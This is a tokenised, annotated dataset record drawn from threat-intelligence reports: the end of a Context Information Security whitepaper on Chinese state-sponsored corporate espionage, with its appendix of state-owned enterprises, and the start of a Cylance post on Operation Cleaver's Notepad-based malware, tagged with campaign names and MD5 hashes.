"in", "\u201cAppendix", "A\u201d", "is", "dominated", "by", "transport", "companies", "(rail", ",", "aerospace", "and"], ["shipping)", ",", "energy", "(petrochemical", ",", "nuclear", ",", "power", "generation/distribution", ",", "hydro)", ",", "telecoms"], ["(mobile", ",", "infrastructure)", ",", "manufacturing", ",", "extraction/metals", "(coal", ",", "iron", ",", "steel", ",", "minerals", ","], ["aluminium)", "and", "trading", "companies", ".", "If", "a", "company", "has", "been", "targeted", "by", "Chinese", "state"], ["sponsored", "cyber", "espionage", ",", "we", "believe", "that", "any", "information", "stolen", "probably", "ends", "up", "in"], ["one", "of", "these", "SOEs", ".", "While", "China", "is", "able", "to", "manipulate", "market", "conditions", "in", "various", "ways", "to"], ["help", "SOEs", "prosper", ",", "nothing", "would", "contribute", "more", "to", "their", "growth", "and", "success", "than", "a", "supply"], ["of", "inside", "information", "about", "the", "activities", "of", "their", "competitors", "and", "customers", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["20", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Conclusion"], ["This", "situation", "has", "not", "developed", "overnight", ".", "These", "attacks", "have", "been", "going", "on", "for", "years:"], ["many", "reports", "detail", "intrusions", "going", "back", "to", "2003", "and", "earlier", ".", "It", "is", "quite", "possible", "that", "the"], ["targets", "of", "early", "attacks", "were", "merely", "foreign", "governments", "and", "dissidents", "and", "that", "the", "range"], ["of", "targets", "only", "broadened", "with", "the", "opening", "of", "the", "Chinese", "economy", "and", "an", "increased"], ["demand", "for", "intelligence", "to", "support", "business", "growth", "and", "projects", "of", "national", "importance", "."], ["The", "more", "success", "the", "attackers", "had", ",", "the", "more", "that", "demand", "grew", ".", "While", "China", "continues", "to"], ["carry", "out", "cyber", "attacks", "on", "companies", "throughout", "the", "rest", "of", "the", "world", "and", "these", "attacks"], ["continue", "either", "unnoticed", "or", "unpunished", ",", "there", "is", "no", "incentive", "for", "China", "to", "stop", ".", "The", "more"], ["that", "stolen", "data", "is", "exploited", "for", "the", "benefit", "of", "companies", "and", "the", "government", ",", "the", "greater"], ["the", "incentive", "to", "continue", "with", "these", "operations", "."], ["Governments", "and", "large", "companies", "do", "not", "appear", "to", "be", "making", "much", "headway", "in", "solving"], ["this", "problem", ".", "For", "large", "corporations", "in", "the", "West", ",", "where", "there", "is", "a", "tendency", "to", "focus", "more", "on"], ["the", "short", "term", "and", "on", "personal", "achievement", "rather", "than", "the", "long", "term", "advancement", "of", "the"], ["state", ",", "the", "potential", "riches", "which", "trade", "with", "China", "offers", "are", "so", "large", "that", "turning", "a", "blind", "eye"], ["to", "data", "theft", "may", "seem", "a", "reasonable", "price", "to", "pay", ".", "Governments", "dare", "not", "risk", "isolation", "from"], ["China", "for", "economic", "and", "political", "reasons", ".", "Norway", "has", "recently", "been", "shut", "out", "of", "Chinese"], ["relations", "after", "awarding", "the", "Nobel", "Peace", "Prize", "to", "a", "jailed", "Chinese", "dissident", "Liu", "Xiaobo20", ".", "Its"], ["trade", "links", "with", "China", "are", "minimal", ",", "so", "it", "can", "afford", "to", "do", "this", ",", "but", "few", "other", "countries", "would"], ["feel", "able", "to", "do", "the", "same", ".", "A", "combination", "of", "this", "reluctance", "to", "act", ",", "chronic", "under-investment"], ["in", "IT", "and", "a", "lack", "of", "user", "education", "about", "how", "to", "spot", "the", "warning", "signs", "of", "a", "potential", "attack"], ["means", "companies", "and", "organisations", "are", "extremely", "vulnerable", "."], ["In", "order", "to", "start", "rectifying", "the", "problem", "there", "is", "a", "need", "in", "the", "first", "instance", "to", "understand", "the"], ["problem", ".", "There", "needs", "to", "be", "an", "acceptance", "that", "this", "problem", "is", "not", "going", "to", "go", "away", ",", "that"], ["this", "is", "a", "business", "risk", "not", "at", "IT", "issue", ".", "Doing", "business", "with", "China", "carries", "extra", "risk", "in", "terms", "of", "data"], ["security", "and", "traditional", "security", "products", "are", "unable", "to", "defend", "your", "data", "against", "this", "type"], ["of", "attack", ".", "Investigation", "of", "compromises", "needs", "to", "be", "thorough", "and", "conducted", "by", "people"], ["familiar", "with", "this", "problem", "and", "not", "simply", "the", "technical", "aspects", "of", "it", ".", "Above", "all", "sensitive", "data"], ["must", "be", "segregated", "\u2013", "it", "is", "not", "possible", "to", "defend", "everything", "."], ["The", "reason", "targeted", "attacks", "pose", "such", "a", "dangerous", "threat", "is", "that", "these", "are", "not", "viruses"], ["which", "simply", "spread", "and", "act", "according", "to", "a", "set", "of", "defined", "rules", "in", "the", "software", ".", "There", "are"], ["human", "beings", "directing", "these", "attacks", "in", "a", "much", "more", "active", "way", ".", "They", "have", "been", "given"], ["specific", "duties", "and", "will", "not", "stop", "what", "they", "are", "doing", "until", "someone", "tells", "them", "to", "do", "so", "."], ["If", "your", "data", "is", "of", "interest", "today", ",", "it", "will", "still", "be", "of", "interest", "tomorrow", ".", "If", "you", "have", "been", "attacked"], ["once", "and", "somehow", "managed", "to", "stop", "it", ",", "you", "have", "only", "stopped", "one", "instance", "of", "the", "attack", ","], ["not", "the", "attack", "as", "a", "whole", ".", "The", "malware", "used", "simply", "provides", "a", "foothold", "in", "the", "network", ",", "an"], ["initial", "point", "of", "access", "through", "which", "other", "tools", "can", "be", "uploaded", "to", "allow", "attackers", "access"], ["over", "the", "longer", "term", ",", "to", "navigate", "through", "the", "network", "until", "they", "find", "the", "data", "of", "interest", "to"], ["them", ".", "If", "one", "technique", "doesn\u2019t", "work", ",", "they", "will", "adapt", "their", "methods", "and", "raise", "their", "game"], ["until", "they", "have", "success", "."], ["It", "may", "be", "that", "one", "day", "western", "governments", "will", "decide", "that", "\u2018if", "you", "can\u2019t", "beat", "them", ",", "join"], ["them\u2019", "and", "develop", "similar", "capabilities", "to", "be", "used", "against", "foreign", "governments", "and"], ["20"], ["http://www", ".", "bbc.co.uk/news/world-asia-pacific-11505164"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["21", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["companies", ".", "We", "can", "only", "speculate", "as", "to", "how", "China", "might", "react", "to", "the", "large-scale"], ["targeting", "of", "its", "own", "companies", "and", "institutions", ".", "As", "for", "now", ",", "we", "have", "limited", "evidence", "of"], ["large", "companies", "failing", "as", "a", "direct", "result", "of", "the", "attacks", ",", "though", "there", "seems", "to", "be"], ["consensus", "that", "Chinese", "intrusions", "at", "least", "contributed", "to", "the", "downfall", "of", "one", "time", "telecoms"], ["giant", "Nortel21", ".", "We", "do", "not", "yet", "know", "how", "many", "others", "may", "follow", "."], ["http://www", ".", "cbc.ca/news/world/story/2012/02/15/nortel-hacking-shields-as-ithappens.html"], ["21"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["22", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["About", "Context"], ["Context", "Information", "Security", "is", "an", "independent", "security", "consultancy", "specialising", "in", "both"], ["technical", "security", "and", "information", "assurance", "services", "."], ["The", "company", "was", "founded", "in", "1998", ".", "Its", "client", "base", "has", "grown", "steadily", "over", "the", "years", ",", "thanks"], ["in", "large", "part", "to", "personal", "recommendations", "from", "existing", "clients", "who", "value", "us", "as", "business"], ["partners", ".", "We", "believe", "our", "success", "is", "based", "on", "the", "value", "our", "clients", "place", "on", "our", "productagnostic", ",", "holistic", "approach;", "the", "way", "we", "work", "closely", "with", "them", "to", "develop", "a", "tailored"], ["service;", "and", "to", "the", "independence", ",", "integrity", "and", "technical", "skills", "of", "our", "consultants", "."], ["Context", "are", "ideally", "placed", "to", "work", "with", "clients", "worldwide", "with", "offices", "in", "the", "UK", ",", "Australia"], ["and", "Germany", "."], ["The", "company\u2019s", "client", "base", "now", "includes", "some", "of", "the", "most", "prestigious", "blue", "chip", "companies"], ["in", "the", "world", ",", "as", "well", "as", "government", "organisations", "."], ["The", "best", "security", "experts", "need", "to", "bring", "a", "broad", "portfolio", "of", "skills", "to", "the", "job", ",", "so", "Context", "has"], ["always", "sought", "to", "recruit", "staff", "with", "extensive", "business", "experience", "as", "well", "as", "technical"], ["expertise", ".", "Our", "aim", "is", "to", "provide", "effective", "and", "practical", "solutions", ",", "advice", "and", "support:", "when"], ["we", "report", "back", "to", "clients", "we", "always", "communicate", "our", "findings", "and", "recommendations", "in"], ["plain", "terms", "at", "a", "business", "level", "as", "well", "as", "in", "the", "form", "of", "an", "in-depth", "technical", "report", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["23", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Appendix"], ["No", "."], ["Company", "Name"], ["Website"], ["1"], ["China", "National"], ["Nuclear"], ["Corporation"], ["http://www", ".", "cnnc.com.cn"], ["2"], ["China", "Nuclear"], ["Engineering", "Group"], ["Corporation"], ["http://www", ".", "cnecc.com"], ["3"], ["China", "Aerospace"], ["Science", "and"], ["Technology"], ["Corporation"], ["http://www", ".", "spacechina.com"], ["4"], ["China", "Aerospace"], ["Science", "and"], ["Industry"], ["Corporation"], ["http://www", ".", "casic.com.cn"], ["5"], ["Aviation", "Industry"], ["Corporation", "of"], ["China"], ["http://www", ".", "avic.com.cn"], ["6"], ["China", "State"], ["Shipbuilding"], ["Corporation"], ["http://www", ".", "cssc.net.cn"], ["7"], ["China", "Shipbuilding"], ["Industry"], ["Corporation"], ["http://www", ".", "csic.com.cn"], ["8"], ["China", "North"], ["Industries", "Group"], ["Corporation"], ["http://www", ".", "norincogroup.com.cn"], ["9"], ["China", "South"], ["Industries", "Group"], ["Corporation"], ["http://www", ".", "csgc.com.cn"], ["10"], ["China", "Electronics"], ["Technology", "Group"], ["Corporation"], ["http://www", ".", "cetc.com.cn"], ["11"], ["China", "National"], ["Petroleum"], ["Corporation"], ["http://www", ".", "cnpc.com.cn/cn"], ["12"], ["China"], ["Petrochemical"], ["Corporation"], ["http://www", ".", "sinopecgroup.c"], ["om"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["24", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["13"], ["China", "National"], ["Offshore", "Oil"], ["Corporation"], ["http://www", ".", "cnooc.com.cn"], ["14"], ["State", "Grid"], ["Corporation", "of"], ["China"], ["http://www", ".", "sgcc.com.cn"], ["15"], ["China", "Southern"], ["Power", "Grid", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "csg.cn"], ["16"], ["China", "Huaneng"], ["Group"], ["http://www", ".", "chng.com.cn"], ["17"], ["China", "Datang"], ["Corporation"], ["http://www", ".", "china-cdt.com"], ["18"], ["China", "Huadian"], ["Corporation"], ["http://www", ".", "chd.com.cn"], ["19"], ["China", "Guodian"], ["Corporation"], ["http://www", ".", "cgdc.com.cn"], ["20"], ["China", "Power"], ["Investment"], ["Corporation"], ["http://www", ".", "cpicorp.com.cn"], ["21"], ["China", "Three", "Gorges"], ["Corporation"], ["http://www", ".", "ctgpc.com.cn/"], ["22"], ["Shenhua", "Group"], ["Corporation", "Limited"], ["http://www", ".", "shenhuagroup.com.cn"], ["23"], ["China"], ["Telecommunication"], ["s", "Corporation"], ["http://www", ".", "chinatelecom.com.cn"], ["24"], ["China", "United"], ["Network"], ["Communications"], ["Group", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "chinaunicom.com.cn"], ["25"], ["China", "Mobile"], ["Communications"], ["Corporation"], ["http://www", ".", "10086.cn"], ["26"], ["China", "Electronics"], ["Corporation"], ["http://www", ".", "cec.com.cn"], ["27"], ["China", "FAW", "Group"], ["Corporation"], ["http://www", ".", "faw.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["25", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["28"], ["Dongfeng", "Motor"], ["Corporation"], ["http://www", ".", "dfmc.com.cn"], ["29"], ["China", "First", "Heavy"], ["Industries"], ["http://www", ".", "cfhi.com"], ["30"], ["China", "National"], ["Erzhong", "Group", "Co", "."], ["http://www", ".", "chinaerzhong.com"], ["31"], ["Harbin", "Electric"], ["Corporation"], ["http://www", ".", "hpec.com"], ["32"], ["Dongfang", "Electric"], ["Corporation"], ["http://www", ".", "dongfang.com"], ["33"], ["Anshan", "Iron", "and"], ["Steel", "Group"], ["Corporation"], ["http://www", ".", "ansteelgroup.com"], ["34"], ["Baosteel", "Group"], ["Corporation"], ["http://www", ".", "baosteel.com"], ["35"], ["Wuhan", "Iron", "and"], ["Steel", "(Group)"], ["Corporation"], ["http://www", ".", "wisco.com.cn"], ["36"], ["Aluminum"], ["Corporation", "of"], ["China"], ["http://www", ".", "chalco.com.cn"], ["37"], ["China", "Ocean"], ["Shipping", "(Group)"], ["Company"], ["http://www", ".", "cosco.com"], ["38"], ["China", "Shipping"], ["(Group)", "Company"], ["http://www", ".", "cnshipping.com"], ["39"], ["China", "National"], ["Aviation", "Holding"], ["Company"], ["http://www", ".", "airchinagroup.com"], ["40"], ["China", "Eastern", "Air"], ["Holding", "Company"], ["http://www", ".", "ceair.com"], ["41"], ["China", "Southern", "Air"], ["Holding", "Company"], ["http://www", ".", "csair.cn"], ["42"], ["Sinochem", "Group"], ["http://www", ".", "sinochem.com"], ["43"], ["COFCO", "Limited"], ["http://www", ".", "cofco.com"], ["44"], ["China", "Minmetals"], ["Corporation"], ["http://www", ".", "minmetals.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["26", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["45"], ["China", "General"], ["Technology"], ["(Group)", "Holding", ","], ["Limited"], ["http://www", ".", "genertec.com.cn"], ["46"], ["China", "State"], ["Construction"], ["Engineering"], ["Corporation"], ["http://www", ".", "cscec.com"], ["47"], ["China", "Grain"], ["Reserves"], ["Corporation"], ["http://www", ".", "sinograin.com.cn"], ["48"], ["State", "Development"], ["&", "Investment", "Corp", "."], ["http://www", ".", "sdic.com.cn"], ["49"], ["China", "Merchants"], ["Group"], ["http://www", ".", "cmhk.com"], ["50"], ["China", "Resources"], ["http://www", ".", "crc.com.hk"], ["51"], ["China", "National"], ["Travel", "Service", "(HK)"], ["Group", "Corporation"], ["[China", "Travel"], ["Service", "(Holdings)"], ["Hong", "Kong", "Limited]"], ["http://www", ".", "hkcts.com"], ["52"], ["State", "Nuclear"], ["Power", "Technology"], ["Corporation", "Ltd", "."], ["http://www", ".", "snptc.com.cn"], ["53"], ["Commercial"], ["Aircraft", "Corporation"], ["of", "China", ",", "Ltd", "."], ["http://www", ".", "comac.cc"], ["54"], ["China", "Energy"], ["Conservation", "and"], ["Environmental"], ["Protection", "Group"], ["http://www", ".", "cecic.com.cn"], ["55"], ["China", "International"], ["Engineering"], ["Consulting"], ["Corporation"], ["http://www", ".", "ciecc.com.cn"], ["56"], ["China", "Huafu", "Trade"], ["&", "Development"], ["Group", "Corp", "."], ["http://www", ".", "hfjt.com.cn"], ["57"], ["China", "Chengtong"], ["Holdings", "Group", "Ltd", "."], ["http://www", ".", "cctgroup.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["27", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["58"], ["China", "National"], ["Coal", "Group", "Corp", "."], ["http://www", ".", "chinacoal.com"], ["59"], ["China", "Coal"], ["Technology", "&"], ["Engineering", "Group"], ["Corp", "."], ["http://www", ".", "ccteg.cn"], ["60"], ["China", "National"], ["Machinery", "Industry"], ["Corporation"], ["http://www", ".", "sinomach.com.cn"], ["61"], ["China", "Academy", "of"], ["Machinery", "Science"], ["&", "Technology"], ["http://www", ".", "cam.com.cn"], ["62"], ["Sinosteel"], ["Corporation"], ["http://www", ".", "sinosteel.com"], ["63"], ["China", "Metallurgical"], ["Group", "Corporation"], ["http://www", ".", "mcc.com.cn"], ["64"], ["China", "Iron", "&", "Steel"], ["Research", "Institute"], ["Group"], ["http://www", ".", "cisri.com.cn"], ["65"], ["China", "National"], ["Chemical"], ["Corporation"], ["http://www", ".", "chemchina.com"], ["66"], ["China", "National"], ["Chemical"], ["Engineering", "Group"], ["Corporation"], ["http://www", ".", "cncec.cn"], ["67"], ["Sinolight"], ["Corporation"], ["http://www", ".", "sinolight.cn"], ["68"], ["China", "National", "Arts"], ["&", "Crafts", "(Group)"], ["Corporation"], ["http://www", ".", "cnacgc.com"], ["69"], ["China", "National", "Salt"], ["Industry"], ["Corporation"], ["http://www", ".", "chinasalt.com.cn"], ["70"], ["Huacheng"], ["Investment", "&"], ["Management", "Co", ".", ","], ["Ltd", "."], ["Unknown"], ["71"], ["China", "Hengtian"], ["Group", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "chtgc.com"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["28", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["72"], ["China", "National"], ["Materials", "Group"], ["Corporation", "Ltd", "."], ["http://www", ".", "sinoma.cn"], ["73"], ["China", "National"], ["Building", "Materials"], ["Group", "Corporation"], ["http://www", ".", "cnbm.com.cn"], ["74"], ["China", "Nonferrous"], ["Metal", "Mining"], ["(Group)", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "cnmc.com.cn"], ["75"], ["General", "Research"], ["Institute", "for"], ["Nonferrous", "Metals"], ["http://www", ".", "grinm.com"], ["76"], ["Beijing", "General"], ["Research", "Institute"], ["of", "Mining", "&"], ["Metallurgy"], ["http://www", ".", "bgrimm.com"], ["77"], ["China", "International"], ["Intellectech"], ["Corporation"], ["http://www", ".", "ciic.com.cn"], ["78"], ["China", "Academy", "of"], ["Building", "Research"], ["http://www", ".", "cabr.com.cn"], ["79"], ["China", "North"], ["Locomotive", "and"], ["Rolling", "Stock"], ["Industry", "(Group)"], ["Corporation"], ["http://www", ".", "chinacnr.com"], ["80"], ["China", "South"], ["Locomotive", "&"], ["Rolling", "Stock"], ["Corporation", "Limited"], ["http://www", ".", "csrgc.com.cn"], ["81"], ["China", "Railway"], ["Signal", "&"], ["Communication"], ["Corporation"], ["http://www", ".", "crsc.cn"], ["82"], ["China", "Railway"], ["Group", "Limited"], ["http://www", ".", "crecg.com"], ["83"], ["China", "Railway"], ["Construction"], ["Corporation", "Limited"], ["http://www", ".", "crcc.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["29", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["84"], ["China"], ["Communications"], ["Construction"], ["Company", "Limited"], ["http://www", ".", "ccgrp.com.cn"], ["85"], ["Potevio", "Company"], ["Limited"], ["http://www", ".", "potevio.com"], ["86"], ["China", "Academy", "of"], ["Telecommunication"], ["and", "Technology"], ["http://www", ".", "datanggroup.cn"], ["87"], ["China", "National"], ["Agricultural"], ["Development"], ["Group", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "cnadc.com.cn"], ["88"], ["Chinatex"], ["Corporation"], ["http://www", ".", "chinatex.com"], ["89"], ["Sinotrans", "&", "CSC"], ["Holdings", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "sinotrans-csc.com"], ["90"], ["China", "National", "Silk"], ["Import", "&", "Export"], ["Corporation"], ["http://www", ".", "chinasilk.com"], ["91"], ["China", "Forestry"], ["Group", "Corporation"], ["http://www", ".", "cfgc.cn"], ["92"], ["China", "National"], ["Pharmaceutical"], ["Group", "Corporation"], ["http://www", ".", "sinopharm.com"], ["93"], ["CITS", "Group"], ["Corporation"], ["http://www", ".", "citsgroup.com.cn"], ["94"], ["China", "Poly", "Group"], ["Corporation"], ["http://www", ".", "citsgroup.com.cn"], ["95"], ["Zhuhai", "ZhenRong"], ["Company"], ["http://www", ".", "zhzrgs.com.cn"], ["96"], ["China", "Architecture"], ["Design", "&", "Research"], ["Group"], ["http://www", ".", "cadreg.com.cn"], ["97"], ["China", "Metallurgical"], ["Geology", "Bureau"], ["http://www", ".", "cmgb.com.cn"], ["98"], ["China", "National"], ["Administration", "of"], ["Coal", "Geology"], ["http://www", ".", "ccgc.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["30", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["99"], ["Xinxing", "Cathay"], ["International", "Group"], ["Co", ".", ",", "Ltd", "."], ["http://www", ".", "xxcig.com"], ["100"], ["China", "Travelsky"], ["Holding", "Company"], ["http://www", ".", "travelskyholding"], ["s", ".", "com"], ["101"], ["China", "National"], ["Aviation", "Fuel", "Group"], ["Corporation"], ["http://www", ".", "cnaf.com"], ["102"], ["China", "Aviation"], ["Supplies", "Holding"], ["Company"], ["http://www", ".", "casc.com.cn"], ["103"], ["Power", "Construction"], ["Corporation", "of"], ["China"], ["http://www", ".", "zhongguodianjian.com"], ["104"], ["China", "Energy"], ["Engineering", "Group"], ["Co", ".", ",", "Ltd"], ["http://www", ".", "ceec.net.cn"], ["105"], ["China", "National"], ["Gold", "Group"], ["Corporation"], ["http://www", ".", "chinagoldgroup.com"], ["106"], ["China", "National"], ["Cotton", "Reserves"], ["Corporation"], ["http://www", ".", "cncrc.com.cn"], ["107"], ["China", "Printing"], ["(Group)"], ["Corporation"], ["http://www", ".", "cpgc.cn"], ["108"], ["China", "Guangdong"], ["Nuclear", "Power"], ["Holding"], ["Corporation", "Ltd", "."], ["http://www", ".", "cgnpc.com.cn"], ["109"], ["China", "Hualu", "Group"], ["Co", ".", ",", "Ltd", "."], ["http://www", ".", "hualu.com.cn"], ["110"], ["Alcatel-Lucent"], ["Shanghai", "Bell", "Co", ".", ","], ["Ltd", "."], ["http://www", ".", "alcatelsbell.com.cn"], ["111"], ["IRICO", "Group"], ["Corporation"], ["http://www", ".", "ch.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["31", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["112"], ["Wuhan", "Research"], ["Institute", "of", "Post", "and"], ["Telecommunication"], ["s"], ["http://www", ".", "wri.com.cn"], ["113"], ["OCT", "Group"], ["http://www", ".", "chinaoct.com"], ["114"], ["Nam", "Kwong"], ["(Group)", "Company"], ["Limited"], ["http://www", ".", "namkwong.com"], ["", ".", "mo"], ["115"], ["China", "XD", "Group"], ["http://www", ".", "xd.com.cn"], ["116"], ["China", "Railway"], ["Materials"], ["Commercial", "Corp", "."], ["http://www", ".", "crmsc.com.cn"], ["117"], ["China", "Reform"], ["Holdings"], ["Corporation", "Ltd", "."], ["http://www", ".", "crhc.cn/n127514"], ["92/index", ".", "html"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["32", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Context", "Information", "Security", "Ltd"], ["London"], ["(HQ)"], ["Cheltenham"], ["D\u00fcsseldorf"], ["Melbourne"], ["4th", "Floor"], ["Corinth", "House"], ["Adersstr", ".", "28", ",", "1", ".", "OG"], ["Level", "9", ",", "440", "Collins", "St"], ["30", "Marsh", "Wall"], ["117", "Bath", "Road"], ["D-40215", "D\u00fcsseldorf"], ["Melbourne"], ["London", "E14", "9TP"], ["Cheltenham", "GL53", "7LS"], ["Germany"], ["Victoria", "3000"], ["United", "Kingdom"], ["United", "Kingdom"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["Australia"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["33", "/", "33"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "Operation Cleaver", "sent_id": 8, "pos": [6, 7]}, {"old_id": "T2", "type": "Campaign", "name": "Operation Cleaver", "sent_id": 10, "pos": [10, 11]}, {"old_id": "T3", "type": "MD5", "name": "83868cdff62829fe3b897e2720204679", "sent_id": 32, "pos": [0]}, {"old_id": "T4", "type": "Malware", "name": "notepadexe", "sent_id": 33, "pos": []}, {"old_id": "T5", "type": "MD5", "name": "bfc59f1f442686af73704eff6c0226f0", "sent_id": 36, "pos": [0]}, {"old_id": "T6", "type": "Malware", "name": "NOTEPAD2EXE", "sent_id": 37, "pos": []}, {"old_id": "T7", "type": "MD5", "name": "e8ea10d5cde2e8661e9512fb684c4c98", "sent_id": 40, "pos": [0]}, {"old_id": "T8", "type": "Malware", "name": "Notepad3exe", "sent_id": 41, "pos": []}, {"old_id": "T9", "type": "MD5", "name": "baa76a571329cdc4d7e98c398d80450c", "sent_id": 44, "pos": [0]}, {"old_id": "T10", "type": "Malware", "name": "Notepad4exe", "sent_id": 45, "pos": []}, {"old_id": "T11", "type": "MD5", "name": "19d9b37d3acf3468887a4d41bf70e9aa", "sent_id": 48, "pos": [0]}, {"old_id": "T12", "type": "Malware", "name": "notepad10exe", "sent_id": 49, "pos": []}, {"old_id": "T13", "type": "MD5", "name": "d378bffb70923139d6a4f546864aa61c", "sent_id": 52, "pos": [0]}, {"old_id": "T14", "type": "Malware", "name": "Notepad4exe", "sent_id": 94, "pos": []}, {"old_id": "T15", "type": "Campaign", "name": "Cleaver", "sent_id": 441, "pos": [3]}, {"old_id": "T16", "type": "Campaign", "name": "Cleaver", "sent_id": 455, "pos": [10]}, {"old_id": "T17", "type": "Malware", "name": "Notepad3exe", "sent_id": 433, "pos": []}, {"old_id": "T18", "type": "Malware", "name": "Notepad4exe", "sent_id": 433, "pos": []}, {"old_id": "T19", "type": "Malware", "name": "notepad10exe", "sent_id": 433, "pos": []}, {"old_id": "T20", "type": "Malware", "name": "NOTEPAD2EXE", "sent_id": 434, "pos": []}], "labels": [{"old_id": "R1", "r": "P21", "h": 2, "t": 3, "evidence": [32, 33]}, {"old_id": "R2", "r": "P21", "h": 4, "t": 5, "evidence": [36, 37]}, {"old_id": "R3", "r": "P21", "h": 6, "t": 7, "evidence": [40, 41]}, {"old_id": "R4", "r": "P21", "h": 8, "t": 9, "evidence": [44, 45]}, {"old_id": "R5", "r": "P21", "h": 10, "t": 11, "evidence": [48, 49]}], "title": ["inputs/txt/201412CylanceOperationCleaver"], "sents": [["(//www", ".", "cylance.com/)"], ["\u00ab", "Back", "to", "Blog(//blog", ".", "cylance.com)"], ["Operation", "Cleaver:"], ["The", "Notepad", "Files"], ["By", "Derek", "Soeder(//blog", ".", "cylance.com/author/derek-soeder)"], ["|"], ["December", "5", ",", "2014"], ["You", "see", "some", "strange", "stuff", "out", "there", "on", "the", "networks", "where", "attackers", "are", "active", ".", "Certainly", "the"], ["stash", "of", "files", "unearthed", "during", "the", "Operation", "Cleaver", "investigation", "included", "much", "of", "the", "bizarre"], ["and", "something", "of", "the", "terrible", ".", "Brian", "Wallace", ",", "who", "led", "the", "investigation", ",", "shared", "a", "mysterious", "set"], ["of", "samples", "with", "me", "awhile", "back", ",", "and", "now", "that", "Operation", "Cleaver", "is", "public", ",", "I'll", "relate", "the", "lurid"], ["technical", "details", "."], ["The", "Notepad", "Files"], ["The", "files", "in", "question", "were", "found", "in", "a", "dim", "and", "dusty", "directory", "on", "a", "forlorn", "FTP", "server", "in", "the", "US", ","], ["commingled", "with", "the", "detritus", "of", "past", "attack", "campaigns", "and", "successful", "compromises", ".", "They", "were"], ["at", "once", "familiar", "and", "strange", ",", "and", "they", "were", "made", "still", "stranger", "and", "more", "perplexing", "by", "their"], ["location", "and", "the", "circumstances", "of", "their", "discovery", ".", "All", "around", "them", "was", "a", "clutter", "of", "credential"], ["dumps", ",", "hacking", "utilities", ",", "RATs", ",", "and", "even", "legitimate", "software", "installers", ",", "but", "the", "files", "in", "question"], ["were", "none", "of", "these", ".", "They", "were", "Notepad", "."], 